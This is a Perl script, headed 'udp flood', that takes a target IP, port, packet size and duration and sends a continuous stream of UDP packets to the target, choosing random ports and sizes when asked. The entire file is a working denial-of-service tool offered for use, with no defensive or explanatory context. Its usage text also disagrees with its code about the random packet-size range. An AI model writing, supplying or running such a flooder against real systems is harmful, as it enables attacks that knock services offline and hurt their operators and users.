#!/usr/bin/perl

##############
# udp flood.
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "flood.pl <ip> <port> <size> <time>\n\n";
  print " port=0: use random ports\n";
  print " size=0: use random size between 64 and 32500\n";
  print " time=0: continuous flood\n";
  exit(1);
}
 
my ($ip,$port,$size,$time,$pack) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport,$ppack);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 240);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print "Flooding $ip " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(500-64)+64) ;
  $pport = $port ? $port : int(rand(65535))+1;
  $ppack = $pack ? $pack : int(rand(17817435435132543274684684647438141-165235253446464))+234518434864;

send(flood, pack("a$psize","b$ppack",$ppack,"udpflood"), 0, pack_sockaddr_in($pport, $iaddr));}
